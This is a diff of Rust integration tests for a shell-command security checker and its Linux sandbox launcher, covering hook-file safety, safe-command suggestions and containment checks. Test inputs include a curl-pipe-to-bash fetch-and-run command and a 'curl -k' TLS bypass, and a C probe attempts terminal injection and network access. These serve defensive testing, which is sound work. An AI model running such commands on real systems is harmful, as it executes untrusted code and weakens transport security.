@@ -3,6 +3,8 @@
 #[cfg(unix)]
 use std::ffi::{OsStr, OsString};
 use std::fs;
+#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+use std::io::Read;
 #[cfg(unix)]
 use std::io::Write;
 use std::path::{Path, PathBuf};
@@ -72,6 +74,55 @@ fn tirith() -> Command {
         cmd.env_remove(key);
     }
     cmd
+}
+
+#[cfg(unix)]
+#[test]
+fn setup_cursor_force_rejects_hardlinked_hook_without_mutating_external_inode() {
+    use std::os::unix::fs::PermissionsExt;
+
+    let project = tempfile::tempdir().unwrap();
+    let home = tempfile::tempdir().unwrap();
+    let external = tempfile::tempdir().unwrap();
+    let hooks = project.path().join(".cursor/hooks");
+    fs::create_dir_all(&hooks).unwrap();
+    let external_hook = external.path().join("shared-hook.sh");
+    let setup_hook = hooks.join("tirith-hook.sh");
+    fs::write(&external_hook, "external-original").unwrap();
+    fs::set_permissions(&external_hook, fs::Permissions::from_mode(0o640)).unwrap();
+    fs::hard_link(&external_hook, &setup_hook).unwrap();
+
+    let output = tirith()
+        .current_dir(project.path())
+        .env("HOME", home.path())
+        .env("USERPROFILE", home.path())
+        .args(["setup", "cursor", "--scope", "project", "--force"])
+        .output()
+        .unwrap();
+
+    assert!(!output.status.success());
+    assert!(String::from_utf8_lossy(&output.stderr).contains("hard links"));
+    assert_eq!(
+        fs::read_to_string(&external_hook).unwrap(),
+        "external-original"
+    );
+    assert_eq!(
+        fs::read_to_string(&setup_hook).unwrap(),
+        "external-original"
+    );
+    assert_eq!(
+        fs::metadata(&external_hook).unwrap().permissions().mode() & 0o777,
+        0o640
+    );
+    assert!(fs::read_dir(&hooks)
+        .unwrap()
+        .filter_map(Result::ok)
+        .all(|entry| {
+            let name = entry.file_name();
+            let name = name.to_string_lossy();
+            name == "tirith-hook.sh"
+                || (!name.contains("tirith-backup") && !name.starts_with(".tirith-setup-"))
+        }));
 }
 
 /// Regression for the macOS capsule launcher's two-exec descriptor design. The
@@ -388,7 +439,7 @@ fn explain_fix_requires_rule() {
 }
 
 #[test]
-fn check_suggest_safe_command_rewrites_pipe_to_shell() {
+fn check_suggest_safe_command_is_guidance_for_replaceable_test_binary() {
     let out = tirith()
         .args([
             "check",
@@ -398,7 +449,7 @@ fn check_suggest_safe_command_rewrites_pipe_to_shell() {
             "--no-daemon",
             "--suggest-safe-command",
             "--",
-            "curl https://example.com/install.sh | bash",
+            "curl -fsSL https://example.com/install.sh | bash",
         ])
         .output()
         .expect("failed to run tirith");
@@ -409,39 +460,16 @@ fn check_suggest_safe_command_rewrites_pipe_to_shell() {
         "expected safe-command block: {stderr}"
     );
     assert!(
-        stderr.contains("curl -fsSL -o /tmp/tirith-review.sh"),
-        "expected download-to-file rewrite: {stderr}"
+        stderr.contains("No safe executable rewrite"),
+        "expected explicit guidance-only rationale: {stderr}"
     );
-    assert!(
-        stderr.contains("bash /tmp/tirith-review.sh"),
-        "expected review-then-run step: {stderr}"
-    );
+    assert!(!stderr.contains("try:"), "{stderr}");
+    assert!(!stderr.contains("/tmp/"), "{stderr}");
+    assert!(!stderr.contains("less /tmp/"), "{stderr}");
 }
 
 #[test]
-fn check_suggest_safe_command_drops_insecure_tls_flag() {
-    let out = tirith()
-        .args([
-            "check",
-            "--shell",
-            "posix",
-            "--non-interactive",
-            "--no-daemon",
-            "--suggest-safe-command",
-            "--",
-            "curl -k https://example.com/file",
-        ])
-        .output()
-        .expect("failed to run tirith");
-    let stderr = String::from_utf8_lossy(&out.stderr);
-    assert!(
-        stderr.contains("curl https://example.com/file"),
-        "expected the -k flag dropped from the suggestion: {stderr}"
-    );
-}
-
-#[test]
-fn check_suggest_safe_command_json_embeds_suggestions() {
+fn check_suggest_safe_command_keeps_insecure_tls_guidance_only() {
     let out = tirith()
         .args([
             "check",
@@ -453,7 +481,40 @@ fn check_suggest_safe_command_json_embeds_suggestions() {
             "--format",
             "json",
             "--",
-            "curl https://example.com/install.sh | bash",
+            "curl -k https://example.com/file",
+        ])
+        .output()
+        .expect("failed to run tirith");
+    let json: serde_json::Value =
+        serde_json::from_slice(&out.stdout).expect("check --suggest-safe-command --format json");
+    let tls = json["safe_suggestions"]
+        .as_array()
+        .and_then(|suggestions| {
+            suggestions
+                .iter()
+                .find(|suggestion| suggestion["rule_id"] == "insecure_tls_flags")
+        })
+        .expect("insecure_tls_flags guidance");
+    assert!(
+        tls.get("safe_command").is_none(),
+        "TLS flag removal must remain guidance-only: {tls}"
+    );
+}
+
+#[test]
+fn check_suggest_safe_command_json_omits_untrusted_reinvocation() {
+    let out = tirith()
+        .args([
+            "check",
+            "--shell",
+            "posix",
+            "--non-interactive",
+            "--no-daemon",
+            "--suggest-safe-command",
+            "--format",
+            "json",
+            "--",
+            "curl -fsSL https://example.com/install.sh | bash",
         ])
         .output()
         .expect("failed to run tirith");
@@ -463,15 +524,1539 @@ fn check_suggest_safe_command_json_embeds_suggestions() {
         .as_array()
         .expect("safe_suggestions array present");
     assert!(!suggestions.is_empty(), "expected at least one suggestion");
-    let s = &suggestions[0];
+    let s = suggestions
+        .iter()
+        .find(|suggestion| suggestion["rule_id"] == "curl_pipe_shell")
+        .expect("curl_pipe_shell guidance");
     assert_eq!(s["rule_id"], "curl_pipe_shell");
-    assert!(s["safe_command"]
+    assert!(
+        s.get("safe_command").is_none(),
+        "Cargo's user-owned test binary must never cross the delayed reinvocation boundary: {s}"
+    );
+    assert!(s["rationale"]
         .as_str()
-        .is_some_and(|c| c.contains("/tmp/tirith-review.sh")));
+        .is_some_and(|rationale| rationale.contains("No safe executable rewrite")));
     // Findings still carry per-rule remediation independently of the flag.
     assert!(v["findings"][0]["remediation"]
         .as_str()
         .is_some_and(|s| !s.is_empty()));
+}
+
+#[test]
+fn commands_check_reconstructs_only_proven_posix_multi_argv() {
+    let cwd = tempfile::tempdir().expect("isolated nested commands-check cwd");
+    for (shell, command) in [
+        ("posix", "echo ok"),
+        ("fish", "echo ok"),
+        ("powershell", "Write-Output ok"),
+        ("cmd", "echo ok"),
+    ] {
+        let output = tirith()
+            .current_dir(cwd.path())
+            .args(["commands", "check", "--shell", shell, "--", command])
+            .output()
+            .expect("run single-string nested commands check");
+        assert_eq!(
+            output.status.code(),
+            Some(0),
+            "one already-formed {shell} command must remain verbatim: stderr={}",
+            String::from_utf8_lossy(&output.stderr)
+        );
+    }
+
+    let posix = tirith()
+        .current_dir(cwd.path())
+        .args([
+            "commands", "check", "--shell", "posix", "--", "printf", "%s", "a b",
+        ])
+        .output()
+        .expect("run POSIX multi-argv nested commands check");
+    assert_eq!(
+        posix.status.code(),
+        Some(0),
+        "POSIX multi-argv reconstruction must preserve word boundaries: stderr={}",
+        String::from_utf8_lossy(&posix.stderr)
+    );
+
+    for shell in ["fish", "powershell", "cmd"] {
+        let output = tirith()
+            .current_dir(cwd.path())
+            .args(["commands", "check", "--shell", shell, "--", "echo", "a b"])
+            .output()
+            .expect("run refused non-POSIX multi-argv nested commands check");
+        assert_eq!(output.status.code(), Some(2), "shell={shell}");
+        assert!(
+            String::from_utf8_lossy(&output.stderr)
+                .contains("multi-argument Fish/PowerShell/Cmd input cannot be reconstructed"),
+            "shell={shell} stderr={}",
+            String::from_utf8_lossy(&output.stderr)
+        );
+    }
+
+    let json = tirith()
+        .current_dir(cwd.path())
+        .args([
+            "commands",
+            "check",
+            "--shell",
+            "powershell",
+            "--json",
+            "--",
+            "Write-Output",
+            "a b",
+        ])
+        .output()
+        .expect("run JSON non-POSIX multi-argv refusal");
+    assert_eq!(json.status.code(), Some(2));
+    let value: serde_json::Value =
+        serde_json::from_slice(&json.stdout).expect("structured reconstruction refusal");
+    assert!(value["error"]
+        .as_str()
+        .is_some_and(|reason| reason.contains("multi-argument Fish/PowerShell/Cmd")));
+}
+
+/// A process ceiling that accounts for the UID this test already shares.
+///
+/// `RLIMIT_NPROC` is counted PER-UID, not per-process-tree. Under `cargo test`
+/// the UID owns the harness, this binary's threads, and every other test's
+/// children, so a fixed small ceiling sits below the live count and the
+/// contained `fork()` fails with EAGAIN before the target execs. Measure the
+/// live count and bound the fixture's own fan-out on top of it: still far
+/// below the host default, so a runaway fork is still capped, but immune to
+/// whatever else the UID happens to be running.
+#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+fn capsule_process_ceiling(own_fanout: u32) -> u32 {
+    use std::os::unix::fs::MetadataExt as _;
+
+    let uid = unsafe { libc::geteuid() };
+    let live = fs::read_dir("/proc")
+        .map(|entries| {
+            entries
+                .flatten()
+                .filter(|entry| {
+                    entry
+                        .file_name()
+                        .to_str()
+                        .is_some_and(|name| name.bytes().all(|byte| byte.is_ascii_digit()))
+                })
+                .filter(|entry| fs::metadata(entry.path()).is_ok_and(|meta| meta.uid() == uid))
+                .count()
+                .try_into()
+                .unwrap_or(u32::MAX)
+        })
+        .unwrap_or(0u32);
+    // The slack absorbs processes other tests start between this measurement
+    // and the contained fork.
+    live.saturating_add(own_fanout).saturating_add(256)
+}
+
+/// stderr from a capsule child, minus the one note a downgraded kernel prints.
+///
+/// A hosted kernel can enforce only a best-effort subset of the requested
+/// Landlock restrictions, and the child says so on stderr. That note means the
+/// run behaved correctly under a weaker kernel, not that anything went wrong,
+/// so it must not fail an "expected no stderr" assertion — while every other
+/// line still does.
+#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+fn capsule_stderr_without_coverage_notes(stderr: &[u8]) -> String {
+    String::from_utf8_lossy(stderr)
+        .lines()
+        .filter(|line| !line.contains("Landlock partially enforced"))
+        .filter(|line| !line.trim().is_empty())
+        .collect::<Vec<_>>()
+        .join("\n")
+}
+
+/// Read a capsule child's one-byte kernel observation.
+///
+/// `read_exact` reports only "failed to fill whole buffer" when the child died
+/// before publishing, which says nothing about why the sandbox refused to come
+/// up. Reap the child and name its exit status instead.
+#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+fn read_capsule_observation(
+    reader: &mut impl std::io::Read,
+    child: &mut std::process::Child,
+    what: &str,
+) -> [u8; 1] {
+    let mut observed = [0u8; 1];
+    match reader.read_exact(&mut observed) {
+        Ok(()) => observed,
+        Err(error) => {
+            let status = child.wait();
+            // The child reports WHY it refused on stderr, and the harness
+            // captures it out of reach of this panic, so read it back here.
+            // Drain before reporting: the exit status alone ("exited with 2")
+            // names none of the dozen refusal paths.
+            let reason = child
+                .stderr
+                .take()
+                .map(|mut pipe| {
+                    let mut buffer = String::new();
+                    let _ = pipe.read_to_string(&mut buffer);
+                    buffer
+                })
+                .unwrap_or_default();
+            panic!(
+                "{what}: {error}; the capsule child exited with {status:?}; stderr: {}",
+                reason.trim()
+            );
+        }
+    }
+}
+
+#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+#[test]
+fn hidden_capsule_launcher_refuses_missing_parent_temp_home_before_exec() {
+    let marker_dir = tempfile::tempdir().expect("marker tempdir");
+    let marker = marker_dir.path().join("executed");
+    let program = format!("printf launched > '{}'", marker.display());
+    let spec_json = serde_json::to_string(&tirith_core::capsule::CapsuleSpec::locked_down())
+        .expect("serialize locked-down spec");
+    let output = tirith()
+        .args([
+            "__capsule-child",
+            spec_json.as_str(),
+            "--",
+            "/bin/sh",
+            "-c",
+            program.as_str(),
+        ])
+        .output()
+        .expect("run hidden launcher without parent temp home");
+    assert!(!output.status.success());
+    assert!(
+        String::from_utf8_lossy(&output.stderr)
+            .contains("temporary_home requires a parent-owned, policy-granted --temp-home"),
+        "unexpected refusal: {}",
+        String::from_utf8_lossy(&output.stderr)
+    );
+    assert!(
+        !marker.exists(),
+        "missing temp-home refusal must precede exec"
+    );
+}
+
+#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+#[test]
+fn hidden_capsule_launcher_runs_a_harmless_dynamic_stdin_shell() {
+    use std::os::fd::{AsRawFd as _, FromRawFd as _};
+    use std::os::unix::fs::PermissionsExt as _;
+    use std::os::unix::process::CommandExt as _;
+    use tirith_core::capsule::linux::LandlockSeccompCapsule;
+    use tirith_core::capsule::{Capsule as _, CapsuleSpec, ResourceLimits};
+    use tirith_core::trusted_child::TrustedExecutable;
+
+    const PLANTED_FD: i32 = 198;
+    const SEALED_TARGET_FD: i32 = 63;
+    const LAUNCH_STATUS_FD: i32 = 61;
+    const LAUNCH_ACK_FD: i32 = 60;
+    let secret_dir = tempfile::tempdir().expect("private inherited-fd fixture");
+    let secret_path = secret_dir.path().join("secret");
+    fs::write(&secret_path, b"must not be inherited").expect("write inherited-fd fixture");
+    let secret = fs::File::open(&secret_path).expect("open inherited-fd fixture");
+    // Bind a private copy: the fixture below destroys the pathname snapshot
+    // after binding, and doing that to the host's real /bin/bash would replace
+    // the system shell for everything that runs afterwards.
+    let interpreter_dir = tempfile::tempdir().expect("private interpreter fixture");
+    // The resolver walks every ancestor, so state the fixture directory's mode
+    // rather than inheriting whatever the temp root and umask produce.
+    fs::set_permissions(interpreter_dir.path(), fs::Permissions::from_mode(0o700))
+        .expect("private fixture directory");
+    let interpreter_path = interpreter_dir.path().join("bash");
+    fs::copy("/bin/bash", &interpreter_path).expect("copy system bash into the fixture");
+    fs::set_permissions(&interpreter_path, fs::Permissions::from_mode(0o755))
+        .expect("make the interpreter copy executable");
+    let interpreter = TrustedExecutable::from_absolute(&interpreter_path, &[])
+        .unwrap_or_else(|error| {
+            let modes: Vec<String> = interpreter_path
+                .ancestors()
+                .map(|ancestor| {
+                    use std::os::unix::fs::MetadataExt as _;
+                    let mode = fs::metadata(ancestor)
+                        .map(|meta| format!("{:o}", meta.mode() & 0o7777))
+                        .unwrap_or_else(|error| error.to_string());
+                    format!("{}={mode}", ancestor.display())
+                })
+                .collect();
+            panic!(
+                "resolve the copied interpreter: {error}; modes: {}",
+                modes.join(" ")
+            )
+        })
+        .bind_content()
+        .expect("bind exact interpreter bytes before launch");
+
+    let mut status_descriptors = [0i32; 2];
+    assert_eq!(
+        unsafe { libc::pipe2(status_descriptors.as_mut_ptr(), libc::O_CLOEXEC) },
+        0,
+        "create production status pipe: {}",
+        std::io::Error::last_os_error()
+    );
+    let mut ack_descriptors = [0i32; 2];
+    assert_eq!(
+        unsafe {
+            libc::socketpair(
+                libc::AF_UNIX,
+                libc::SOCK_STREAM | libc::SOCK_CLOEXEC,
+                0,
+                ack_descriptors.as_mut_ptr(),
+            )
+        },
+        0,
+        "create production ACK socket: {}",
+        std::io::Error::last_os_error()
+    );
+    let mut status_reader = unsafe { fs::File::from_raw_fd(status_descriptors[0]) };
+    let status_writer = unsafe { fs::File::from_raw_fd(status_descriptors[1]) };
+    let ack_guard = unsafe { fs::File::from_raw_fd(ack_descriptors[0]) };
+    let ack_parent = unsafe { fs::File::from_raw_fd(ack_descriptors[1]) };
+
+    // Compile a tiny probe before containment. It distinguishes an actual
+    // `socket(2) -> EPERM` result from exec/loader/utility failures, so the test
+    // cannot mislabel an unrelated wget failure as network denial.
+    let helper_dir = tempfile::Builder::new()
+        .prefix("tirith-socket-probe-")
+        .tempdir_in("/tmp")
+        .expect("create direct socket probe directory");
+    let helper_source = helper_dir.path().join("socket_probe.c");
+    let helper_binary = helper_dir.path().join("socket-probe");
+    fs::write(
+        &helper_source,
+        b"#include <errno.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <sys/ioctl.h>\n#include <sys/socket.h>\n#include <unistd.h>\nint main(void) { errno = 0; if (fcntl(198, F_GETFD) != -1 || errno != EBADF) { printf(\"fd-198-not-closed-%d\", errno); return 39; } errno = 0; if (fcntl(63, F_GETFD) != -1 || errno != EBADF) { printf(\"sealed-fd-not-closed-%d\", errno); return 44; } fputs(\"closed:\", stdout); struct winsize ws; errno = 0; (void)ioctl(STDOUT_FILENO, TIOCGWINSZ, &ws); if (errno == EPERM) { fputs(\"safe-ioctl-blocked\", stdout); return 40; } char byte = 'x'; errno = 0; if (ioctl(STDIN_FILENO, TIOCSTI, &byte) == 0 || errno != EPERM) { printf(\"tiocsti-not-seccomp-eperm-%d\", errno); return 41; } fputs(\"descriptor-controls-ok:\", stdout); errno = 0; int fd = socket(AF_INET, SOCK_STREAM, 0); if (fd >= 0) { close(fd); fputs(\"network-open\", stdout); return 42; } if (errno == EPERM) { fputs(\"network-eperm\", stdout); return 0; } printf(\"network-other-%d\", errno); return 43; }\n",
+    )
+    .expect("write direct socket probe source");
+    let compile = Command::new("cc")
+        .args(["-O2", "-o"])
+        .arg(&helper_binary)
+        .arg(&helper_source)
+        .status()
+        .expect("run native compiler for direct socket probe");
+    assert!(compile.success(), "compile direct socket probe");
+    let helper_binary = helper_binary
+        .canonicalize()
+        .expect("canonical direct socket probe");
+
+    let temp_home = tempfile::Builder::new()
+        .prefix("tirith-capsule-integration-")
+        .tempdir_in("/tmp")
+        .expect("create parent-owned capsule HOME");
+    fs::set_permissions(temp_home.path(), fs::Permissions::from_mode(0o700))
+        .expect("secure parent-owned capsule HOME");
+    let temp_home_path = temp_home
+        .path()
+        .canonicalize()
+        .expect("canonical parent-owned capsule HOME");
+    for relative in [
+        ".config",
+        ".cache",
+        ".local",
+        ".local/share",
+        ".local/state",
+    ] {
+        let directory = temp_home_path.join(relative);
+        fs::create_dir_all(&directory).expect("precreate advertised XDG directory");
+        fs::set_permissions(&directory, fs::Permissions::from_mode(0o700))
+            .expect("secure advertised XDG directory");
+    }
+
+    let mut spec = CapsuleSpec::locked_down();
+    spec.resources = ResourceLimits {
+        cpu_seconds: Some(10),
+        memory_bytes: Some(512 * 1024 * 1024),
+        max_processes: Some(capsule_process_ceiling(64)),
+        max_open_files: Some(64),
+        max_output_bytes: None,
+        wall_clock_seconds: None,
+    };
+    spec.environment.allow = vec!["PATH".to_string()];
+    for root in [
+        "/bin",
+        "/usr/bin",
+        "/lib",
+        "/lib64",
+        "/usr/lib",
+        "/usr/lib64",
+        "/usr/share",
+        "/etc/ld.so.cache",
+        "/etc/nsswitch.conf",
+        "/etc/passwd",
+        "/etc/group",
+    ] {
+        let path = Path::new(root);
+        if let Ok(canonical) = path.canonicalize() {
+            if !spec.filesystem.read_roots.contains(&canonical) {
+                spec.filesystem.read_roots.push(canonical);
+            }
+        }
+    }
+    spec.filesystem.read_roots.push(
+        secret_dir
+            .path()
+            .canonicalize()
+            .expect("canonical secret root"),
+    );
+    spec.filesystem.read_roots.push(
+        helper_dir
+            .path()
+            .canonicalize()
+            .expect("canonical socket probe root"),
+    );
+    spec.filesystem.read_roots.push(
+        interpreter_dir
+            .path()
+            .canonicalize()
+            .expect("canonical interpreter fixture root"),
+    );
+    spec.handles.extra_unix_fds.push(SEALED_TARGET_FD);
+    spec.handles.extra_unix_fds.push(LAUNCH_STATUS_FD);
+    spec.handles.extra_unix_fds.push(LAUNCH_ACK_FD);
+    spec.filesystem.read_roots.push(temp_home_path.clone());
+    spec.filesystem.write_roots.push(temp_home_path.clone());
+
+    let backend = LandlockSeccompCapsule;
+    let available = backend.available_coverage(&spec);
+    if available.is_degraded_against(&spec.required_coverage()) {
+        assert!(
+            std::env::var_os("TIRITH_REQUIRE_CAPSULE_RECEIPT").is_none(),
+            "required production capsule receipt cannot run: available={:?} required={:?}",
+            available,
+            spec.required_coverage()
+        );
+        eprintln!(
+            "skipping production capsule receipt: this Linux host lacks required Landlock/seccomp coverage"
+        );
+        return;
+    }
+
+    let spec_json = serde_json::to_string(&spec).expect("serialize production capsule spec");
+    let mut command = tirith();
+    command
+        .arg("__capsule-child")
+        .arg(spec_json)
+        .arg("--target-argv0")
+        .arg("bash")
+        .arg("--target-fd")
+        .arg(SEALED_TARGET_FD.to_string())
+        .arg("--launch-status-fd")
+        .arg(LAUNCH_STATUS_FD.to_string())
+        .arg("--launch-ack-fd")
+        .arg(LAUNCH_ACK_FD.to_string())
+        .arg("--temp-home")
+        .arg(&temp_home_path)
+        .arg("--")
+        .arg(interpreter.launch_path())
+        .args(["-s", "--", "feature value"])
+        .arg(&helper_binary)
+        .arg(secret_dir.path())
+        .env("PATH", "/bin:/usr/bin")
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped());
+    let source_fd = secret.as_raw_fd();
+    let interpreter_fd = interpreter
+        .bound_launch_fd()
+        .expect("Linux binding must retain a sealed executable descriptor");
+    let status_writer_fd = status_writer.as_raw_fd();
+    let ack_guard_fd = ack_guard.as_raw_fd();
+    // Destroy the pathname snapshot before spawn. The held descriptor remains
+    // immutable and executable; any later path reopen would run these hostile
+    // bytes and fail the receipt instead of producing the expected shell output.
+    fs::set_permissions(interpreter.launch_path(), fs::Permissions::from_mode(0o700))
+        .expect("make pathname snapshot writable for held-fd race fixture");
+    fs::write(interpreter.launch_path(), b"#!/bin/sh\nexit 97\n")
+        .expect("replace pathname snapshot after sealed binding");
+    // SAFETY: this runs after fork in the child. dup2/fcntl/close are
+    // async-signal-safe, and all captured values are plain descriptors.
+    unsafe {
+        command.pre_exec(move || {
+            if libc::setpgid(0, 0) != 0 {
+                return Err(std::io::Error::last_os_error());
+            }
+            if libc::dup2(source_fd, PLANTED_FD) < 0 {
+                return Err(std::io::Error::last_os_error());
+            }
+            if libc::fcntl(PLANTED_FD, libc::F_SETFD, 0) < 0 {
+                return Err(std::io::Error::last_os_error());
+            }
+            if libc::dup2(interpreter_fd, SEALED_TARGET_FD) < 0 {
+                return Err(std::io::Error::last_os_error());
+            }
+            if libc::fcntl(SEALED_TARGET_FD, libc::F_SETFD, 0) < 0 {
+                return Err(std::io::Error::last_os_error());
+            }
+            if libc::dup2(status_writer_fd, LAUNCH_STATUS_FD) < 0
+                || libc::fcntl(LAUNCH_STATUS_FD, libc::F_SETFD, 0) < 0
+            {
+                return Err(std::io::Error::last_os_error());
+            }
+            if libc::dup2(ack_guard_fd, LAUNCH_ACK_FD) < 0
+                || libc::fcntl(LAUNCH_ACK_FD, libc::F_SETFD, 0) < 0
+            {
+                return Err(std::io::Error::last_os_error());
+            }
+            Ok(())
+        });
+    }
+    let mut child = command.spawn().expect("spawn real hidden capsule launcher");
+    drop(status_writer);
+    drop(ack_guard);
+    let observed = read_capsule_observation(
+        &mut status_reader,
+        &mut child,
+        "read kernel OBSERVED status",
+    );
+    assert_eq!(observed, [b'O'], "target must remain stopped until ACK");
+    let ack = *b"A";
+    assert_eq!(
+        unsafe {
+            libc::send(
+                ack_parent.as_raw_fd(),
+                ack.as_ptr().cast::<libc::c_void>(),
+                ack.len(),
+                libc::MSG_NOSIGNAL,
+            )
+        },
+        1,
+        "send production ACK_RESUME: {}",
+        std::io::Error::last_os_error()
+    );
+    drop(ack_parent);
+    let mut terminal = Vec::new();
+    status_reader
+        .read_to_end(&mut terminal)
+        .expect("read RESUMED and EOF");
+    assert_eq!(
+        terminal,
+        [b'R'],
+        "terminal success requires detach/resume then EOF"
+    );
+    let script = "printf '<%s:%s>' \"$0\" \"$1\"\n\
+         printf home > \"$TMPDIR/probe\"\n\
+         IFS= read -r home_value < \"$TMPDIR/probe\"\n\
+         if [ \"$home_value\" = home ]; then printf ':home-ok'; else printf ':home-bad'; fi\n\
+         for root in \"$TMPDIR\" \"$XDG_CONFIG_HOME\" \"$XDG_CACHE_HOME\" \"$XDG_DATA_HOME\" \"$XDG_STATE_HOME\"; do\n\
+           { /bin/mkdir \"$root/nested\" || [ -d \"$root/nested\" ]; } && { /bin/mkdir \"$root/nested/child\" || [ -d \"$root/nested/child\" ]; } || exit 92\n\
+           printf nested > \"$root/nested/child/probe\" || exit 93\n\
+         done\n\
+         printf ':xdg-nested-ok'\n\
+         if /bin/mkdir \"$3/landlock-must-deny\" 2>\"$TMPDIR/mkdir-error\"; then exit 94; else printf ':outside-mkdir-denied'; fi\n\
+         printf ':'\n\
+         if \"$2\"; then :; else exit 91; fi\n\
+         printf 'err' >&2\n";
+    child
+        .stdin
+        .take()
+        .expect("launcher stdin")
+        .write_all(script.as_bytes())
+        .expect("write exact reviewed stdin bytes");
+    let output = child.wait_with_output().expect("wait for contained shell");
+    assert!(
+        output.status.success(),
+        "production hidden launcher failed: status={:?} stderr={}",
+        output.status,
+        String::from_utf8_lossy(&output.stderr)
+    );
+    let stdout = String::from_utf8(output.stdout).expect("contained shell UTF-8 stdout");
+    assert_eq!(
+        stdout,
+        "<bash:feature value>:home-ok:xdg-nested-ok:outside-mkdir-denied:closed:descriptor-controls-ok:network-eperm",
+        "argv0, inherited-fd closure, nested HOME/XDG I/O, Landlock write confinement, ioctl filtering, and direct socket denial must all be proven"
+    );
+    assert_eq!(
+        capsule_stderr_without_coverage_notes(&output.stderr),
+        "err",
+        "only the script's own stderr should reach the parent"
+    );
+    assert_eq!(
+        fs::read(temp_home_path.join("probe")).expect("read contained HOME probe"),
+        b"home"
+    );
+    for relative in ["", ".config", ".cache", ".local/share", ".local/state"] {
+        assert_eq!(
+            fs::read(temp_home_path.join(relative).join("nested/child/probe"))
+                .unwrap_or_else(|error| panic!("read contained {relative} nested probe: {error}")),
+            b"nested"
+        );
+    }
+    assert!(
+        !secret_dir.path().join("landlock-must-deny").exists(),
+        "mkdir/mkdirat must remain denied outside Landlock write roots"
+    );
+    drop(temp_home);
+    assert!(
+        !temp_home_path.exists(),
+        "parent-owned capsule HOME must be removed after the complete child exits"
+    );
+}
+
+/// Production availability receipt for reviewed File mode. The hidden launcher
+/// installs the real Landlock/seccomp policy before the target shell execs, and
+/// `/proc` is deliberately absent from every read grant. Success therefore proves
+/// that the interpreter can open the inherited, fully sealed script memfd through
+/// its `/proc/self/fd/<n>` magic link after containment is active.
+#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+#[test]
+fn hidden_capsule_landlock_reads_reviewed_file_through_sealed_memfd_magic_link() {
+    use std::ffi::CString;
+    use std::io::Seek as _;
+    use std::os::fd::{AsRawFd as _, FromRawFd as _};
+    use std::os::unix::fs::PermissionsExt as _;
+    use std::os::unix::process::CommandExt as _;
+    use tirith_core::capsule::linux::LandlockSeccompCapsule;
+    use tirith_core::capsule::{Capsule as _, CapsuleSpec, ResourceLimits};
+    use tirith_core::trusted_child::TrustedExecutable;
+
+    const SEALED_TARGET_FD: i32 = 63;
+    const SEALED_SCRIPT_FD: i32 = 62;
+    const LAUNCH_STATUS_FD: i32 = 61;
+    const LAUNCH_ACK_FD: i32 = 60;
+
+    let interpreter = TrustedExecutable::from_absolute(Path::new("/bin/sh"), &[])
+        .expect("resolve canonical system shell")
+        .bind_content()
+        .expect("bind exact interpreter bytes before launch");
+
+    let script_name = CString::new("tirith-reviewed-file-receipt").unwrap();
+    let script_raw = unsafe {
+        libc::memfd_create(
+            script_name.as_ptr(),
+            libc::MFD_CLOEXEC | libc::MFD_ALLOW_SEALING,
+        )
+    };
+    assert!(
+        script_raw >= 0,
+        "create reviewed-script memfd: {}",
+        std::io::Error::last_os_error()
+    );
+    let mut reviewed_script = unsafe { fs::File::from_raw_fd(script_raw) };
+    reviewed_script
+        .write_all(b"printf 'reviewed-file:%s' \"$0\"\n")
+        .expect("write reviewed script bytes");
+    reviewed_script.rewind().expect("rewind reviewed script");
+    assert_eq!(
+        unsafe { libc::fchmod(reviewed_script.as_raw_fd(), 0o400) },
+        0,
+        "make reviewed script read-only: {}",
+        std::io::Error::last_os_error()
+    );
+    let required_seals =
+        libc::F_SEAL_SEAL | libc::F_SEAL_SHRINK | libc::F_SEAL_GROW | libc::F_SEAL_WRITE;
+    assert_eq!(
+        unsafe {
+            libc::fcntl(
+                reviewed_script.as_raw_fd(),
+                libc::F_ADD_SEALS,
+                required_seals,
+            )
+        },
+        0,
+        "fully seal reviewed script: {}",
+        std::io::Error::last_os_error()
+    );
+
+    let mut status_descriptors = [0i32; 2];
+    assert_eq!(
+        unsafe { libc::pipe2(status_descriptors.as_mut_ptr(), libc::O_CLOEXEC) },
+        0,
+        "create target status pipe: {}",
+        std::io::Error::last_os_error()
+    );
+    let mut ack_descriptors = [0i32; 2];
+    assert_eq!(
+        unsafe {
+            libc::socketpair(
+                libc::AF_UNIX,
+                libc::SOCK_STREAM | libc::SOCK_CLOEXEC,
+                0,
+                ack_descriptors.as_mut_ptr(),
+            )
+        },
+        0,
+        "create target ACK socket: {}",
+        std::io::Error::last_os_error()
+    );
+    let mut status_reader = unsafe { fs::File::from_raw_fd(status_descriptors[0]) };
+    let status_writer = unsafe { fs::File::from_raw_fd(status_descriptors[1]) };
+    let ack_guard = unsafe { fs::File::from_raw_fd(ack_descriptors[0]) };
+    let ack_parent = unsafe { fs::File::from_raw_fd(ack_descriptors[1]) };
+
+    let temp_home = tempfile::Builder::new()
+        .prefix("tirith-reviewed-file-capsule-")
+        .tempdir_in("/tmp")
+        .expect("create parent-owned capsule HOME");
+    fs::set_permissions(temp_home.path(), fs::Permissions::from_mode(0o700))
+        .expect("secure parent-owned capsule HOME");
+    let temp_home_path = temp_home
+        .path()
+        .canonicalize()
+        .expect("canonical capsule HOME");
+    for relative in [
+        ".config",
+        ".cache",
+        ".local",
+        ".local/share",
+        ".local/state",
+    ] {
+        let directory = temp_home_path.join(relative);
+        fs::create_dir_all(&directory).expect("precreate advertised XDG directory");
+        fs::set_permissions(&directory, fs::Permissions::from_mode(0o700))
+            .expect("secure advertised XDG directory");
+    }
+
+    let mut spec = CapsuleSpec::locked_down();
+    spec.resources = ResourceLimits {
+        cpu_seconds: Some(10),
+        memory_bytes: Some(256 * 1024 * 1024),
+        max_processes: Some(capsule_process_ceiling(32)),
+        max_open_files: Some(64),
+        max_output_bytes: None,
+        wall_clock_seconds: None,
+    };
+    spec.environment.allow = vec!["PATH".to_string()];
+    for root in [
+        "/bin",
+        "/usr/bin",
+        "/lib",
+        "/lib64",
+        "/usr/lib",
+        "/usr/lib64",
+        "/etc/ld.so.cache",
+    ] {
+        let path = Path::new(root);
+        if let Ok(canonical) = path.canonicalize() {
+            if !spec.filesystem.read_roots.contains(&canonical) {
